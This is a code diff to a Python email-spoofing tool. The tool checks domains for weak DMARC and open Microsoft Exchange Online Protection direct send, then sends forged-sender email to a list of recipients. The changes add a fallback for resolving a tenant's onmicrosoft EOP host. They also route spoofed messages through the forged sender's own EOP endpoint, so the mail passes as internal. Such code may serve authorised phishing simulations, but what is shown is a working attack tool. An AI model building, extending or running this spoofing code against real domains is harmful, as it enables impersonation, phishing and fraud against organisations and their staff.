@@ -171,7 +171,7 @@ def _is_reputation_block(msg):
     m = msg.lower()
     return any(kw in m for kw in _REPUTATION_KEYWORDS)
 
-def check_eop_direct_send(domain):
+def check_eop_direct_send(domain, onmicrosoft=None):
     # direct_send_open values:
     #   False     = probed, rejected at connector/relay level — actually closed
     #   "likely"  = MAIL FROM accepted; RCPT TO blocked by IP reputation (clean IP would succeed)
@@ -191,7 +191,17 @@ def check_eop_direct_send(domain):
             eop_ip = dns.resolver.resolve(mx_host, "A")[0].to_text()
             result["resolves"] = True
         except Exception:
-            return result
+            if onmicrosoft:
+                alt_host = onmicrosoft.split(".")[0] + ".mail.protection.outlook.com"
+                if alt_host != eop_host:
+                    try:
+                        eop_ip = dns.resolver.resolve(alt_host, "A")[0].to_text()
+                        result["resolves"] = True
+                        result["eop_host"] = alt_host
+                    except Exception:
+                        pass
+            if not eop_ip:
+                return result
 
     result["eop_ip"] = eop_ip
 
@@ -512,7 +522,7 @@ def export_results_csv(results, filename):
         print(f"  {RED}[!]{RESET} Export error: {e}")
 
 # ── Scan orchestrator ───────────────────────────────────────────────────────
-def run_scan(domains):
+def run_scan(domains, onmicrosoft=""):
     """Run DMARC + EOP checks on a list of domains. Returns results list."""
     results = []
     total   = len(domains)
@@ -521,7 +531,7 @@ def run_scan(domains):
         print(f"  {DIM}checking ({n}/{total}) {dom}...{RESET}", end="\r", flush=True)
         res           = check_spoofability(dom)
         res["o365"]   = detect_o365(dom)
-        eop           = check_eop_direct_send(dom)
+        eop           = check_eop_direct_send(dom, onmicrosoft=onmicrosoft or None)
         res["eop_host"]        = eop["eop_host"]
         res["eop_ip"]          = eop["eop_ip"]
         res["resolves"]        = eop["resolves"]
@@ -737,7 +747,7 @@ def menu_check():
         print(f"  {BOLD}{brand_str.upper()}{RESET}  —  {len(domains)} domain(s)")
         print(f"{'═' * W}")
 
-        results = run_scan(domains)
+        results = run_scan(domains, onmicrosoft=onmicro)
 
         if onmicro:
             for r in results:
@@ -847,7 +857,7 @@ def main():
         print(f"  {BOLD}{brand.upper()}{RESET}  —  {len(domains)} domain(s)")
         print(f"{'═' * W}")
 
-        results = run_scan(domains)
+        results = run_scan(domains, onmicrosoft=onmicro)
 
         if onmicro:
             for r in results:
@@ -890,12 +900,31 @@ def main():
             subject, body = cfg
             print(f"  [*] Spoofed email → {len(recipients)} recipient(s)")
 
+        sender_domain = args.sender.split("@")[1]
+        smtp_ip = None
+        route = ""
+        try:
+            mx_answers = dns.resolver.resolve(sender_domain, "MX")
+            for rdata in mx_answers:
+                mx_host = rdata.exchange.to_text().lower().rstrip(".")
+                if "mail.protection.outlook.com" in mx_host:
+                    smtp_ip = dns.resolver.resolve(mx_host, "A")[0].to_text()
+                    route = f"EOP → {mx_host}"
+                    break
+        except Exception:
+            pass
+
+        if not smtp_ip:
+            smtp_ip = get_mx_record(recipients[0].split("@")[1])
+            route = f"MX → {recipients[0].split('@')[1]}"
+
+        if not smtp_ip:
+            print(f"  {RED}[!]{RESET} No route found")
+            return
+
+        print(f"  {DIM}[→] {route}{RESET}")
         for rcp in recipients:
-            rcp_domain = rcp.split("@")[1]
-            mx = get_mx_record(rcp_domain)
-            if not mx:
-                continue
-            send_email(mx, args.sender, rcp, subject, body)
+            send_email(smtp_ip, args.sender, rcp, subject, body)
         return
 
     parser.print_help()
